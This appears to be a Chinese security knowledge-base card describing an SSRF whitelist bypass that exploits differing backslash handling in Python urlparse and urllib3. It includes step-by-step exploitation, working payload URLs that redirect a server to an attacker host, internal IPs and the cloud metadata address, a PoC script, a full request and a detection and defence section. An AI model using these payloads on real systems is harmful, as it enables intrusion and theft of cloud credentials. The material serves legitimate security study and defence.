---
id: web-generic-ssrf-python-urlparse-urllib3-backslash-bypass
title: Python urlparse 与 urllib3 反斜杠解析分歧绕过域名后缀白名单 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: python-urlparse-urllib3-backslash-differential
aliases:
- Python SSRF 反斜杠绕过
- urlparse urllib3 解析差异
- myqcloud 域名后缀白名单绕过
- urllib3 parse_url 绕过
- 域名后缀白名单 SSRF
tags:
- ssrf
- python
- urllib3
- urlparse
- url-parser
- allowlist
- backslash
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V4
  verified_at: '2026-11-04T21:46:53+08:00'
  notes: 已对照原文核对：urlparse 视反斜杠为普通字符 hostname=a.myqcloud.com 通过后缀白名单，urllib3.parse_url 以反斜杠截断 authority host=vps.com；本地双解析器对比(截图2/3/4)与内网全回显请求(截图5)佐证。卡片已注明后端校验代码为报错反推；原文无组件版本，未设versions；未执行PoC
---

## 一句话结论

应用用 `urllib.parse.urlparse` 取 `hostname` 并以 `endswith("myqcloud.com")` 做域名后缀白名单，却用 `urllib3` 发起请求时，`https://vps.com\@a.myqcloud.com/x.jpg` 会被校验端解析为 host=`a.myqcloud.com`（放行），被 urllib3 解析为 host=`vps.com`（实际连接攻击者），从而绕过白名单形成全回显 SSRF。

## 原理

URL 的 authority 段语法是 `scheme://[userinfo@]host[:port]/path`，但两个 Python 解析器对反斜杠的处理不同：

- **`urllib.parse.urlparse`（RFC 3986 口径）**：`\` 不是分隔符，只是普通字符；按最后一个 `@` 切分 userinfo 与 host。对 `https://vps.com\@a.myqcloud.com/x.jpg`，userinfo=`vps.com\`，hostname=`a.myqcloud.com`，`endswith("myqcloud.com")` 成立，校验放行。
- **`urllib3.util.parse_url`（向 WHATWG/浏览器行为看齐）**：authority 的匹配正则以 `[^\\/?#]*` 截断，反斜杠和 `/`、`?`、`#` 一样被视为 authority 终止符。它在 `vps.com\` 处截断，authority=`vps.com`，host=`vps.com`；`@` 根本没有机会参与 userinfo 切分，剩余部分进入 path（编码为 `/%5C@a.myqcloud.com/x.jpg`）。

于是校验端看到的是被允许的腾讯云域名，执行端实际向攻击者 VPS 发起 HTTPS 请求。把 `vps.com` 换成内网 IP 或云元数据地址，配合“下载后加工并返回资源”的功能，即可拿到全回显 SSRF。单 `@` payload（`https://vps.com@a.myqcloud.com`）在两边都解析为 `a.myqcloud.com`，所以无效；分歧只在反斜杠参与时出现。

## 触发条件

- Python 应用提供“用户提交 URL → 服务端下载/预览/加工资源”的功能（文件上传后按可控地址加载是典型入口）；
- 校验逻辑使用 `urllib.parse.urlparse(...).hostname` 做域名后缀/主机白名单；
- 实际请求由 `urllib3` 或基于 urllib3 的 `requests` 发起；
- 输入中的反斜杠未被拦截、转义或归一化；
- 服务端到内网/元数据地址没有网络层访问控制；
- 响应内容会被返回或参与后续处理（全回显条件）。

## 利用步骤

1. **探测白名单口径**：提交 `https://x.myqcloud.com@vps.com`，若被拒绝，说明校验取的是 `@` 后的 host（urlparse 行为）；提交 `https://vps.com@x.myqcloud.com` 能通过但请求到腾讯云，说明 `@` 未被过滤、校验的是 host 后缀。
2. **指纹后端库**：提交一个不存在的允许域名（如 `https://anybucket.myqcloud.com/x.jpg`），观察报错。若出现 `HTTPSConnectionPool`、`NameResolutionError`、`urllib3.connection.HTTPSConnection`，可确认请求由 urllib3 发起，并据此推断校验也可能用 Python 的 `urlparse`。
3. **构造分歧 payload**：`https://vps.com\@a.myqcloud.com/x.jpg`。urlparse 放行，urllib3 连接 `vps.com`。
4. **验证回连**：在 VPS 上监听 443/HTTP，确认收到来自目标服务器的请求；若响应被业务加工后返回，则同时验证全回显。
5. **转向内网**：把 `vps.com` 替换为内网 IP/端口（如 `http://10.0.0.5:8080\@a.myqcloud.com/`）或云元数据地址（`http://169.254.169.254/latest/meta-data/\@a.myqcloud.com/`），读取内网服务或临时凭证。

## PoC

两个解析器的差异可本地复现：

```python
from urllib.parse import urlparse
from urllib3.util import parse_url

u = r"https://vps.com\@a.myqcloud.com/x.jpg"

p = urlparse(u)
print("urlparse userinfo:", p.username)   # vps.com\
print("urlparse hostname:", p.hostname)   # a.myqcloud.com  -> 白名单通过

q = parse_url(u)
print("urllib3 host:", q.host)            # vps.com         -> 实际连接目标
print("urllib3 path:", q.path)            # /%5C@a.myqcloud.com/x.jpg
```

校验逻辑等价于：

```python
if not urlparse(user_url).hostname.endswith("myqcloud.com"):
    reject()
else:
    urllib3.PoolManager().request("GET", user_url)  # 实际 host 为 vps.com
```

完整请求形态：

```http
POST /audiobooklm/mcp HTTP/1.1
Content-Type: application/json

{"content_file": "http://10.0.0.5:8080\\@a.myqcloud.com/"}
```

注意：JSON/表单中的反斜杠需要按协议转义；若链路会对 `%5C` 做解码，也可尝试编码形态，但应在目标上验证解码发生在校验前还是请求前。

## 变体与关联

- 变体：`requests` 底层同为 urllib3，行为一致；`httpx`、`aiohttp`、`curl`、Go `net/url`、Java `URI` 对反斜杠的处理各不相同，可形成新的“校验器 vs 执行器”组合。
- 变体：除反斜杠外，`%5C`、全角字符、多个 `@`、制表符/换行、尾随点等也可用于制造解析分歧，但需确认两侧的具体实现。
- 关联：[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（Node fast-uri 与 WHATWG 的同类反斜杠分歧）；[[web-generic-ssrf-ip-notation-blacklist-bypass]]（IP 等价表示绕过黑名单）；[[cloud-metadata]]（打到元数据后的凭证读取）。
- 不确定点：原文未给出后端完整校验代码，校验逻辑由报错和 payload 行为反推；内网目标在截图中被打码，实际可达网段需自行确认。

## 检测与防御

- **统一解析**：校验与请求必须使用同一个解析器、同一份最终 URL 字符串；校验后不要再用另一个库重新解析原始输入。
- **白名单写法**：不要用 `endswith("myqcloud.com")`（还会误放行 `evilmyqcloud.com`），应要求 `.myqcloud.com` 的点边界或精确 host 列表；同时拒绝 userinfo、反斜杠、控制字符和多重 `@`。
- **IP 层校验**：请求前解析 DNS 并对最终 IP 做回环、私网、链路本地、组播、保留地址检查；禁止或限制 30x 跳转，每一跳重新校验；云环境阻断元数据地址。
- **网络层**：出口防火墙/安全组只允许业务必需的外部地址，内网服务做认证与来源限制。
- **日志检测**：URL 参数中出现 `\`、`%5C`、`%5c`、多重 `@`；同一功能对内网/元数据地址发起连接；DNS 解析记录指向内网；urllib3/requests 的异常栈暴露在响应中。
- **错误处理**：不要将 `HTTPSConnectionPool`、`NameResolutionError`、栈信息返回给用户，避免泄露后端库与校验实现；统一错误页。
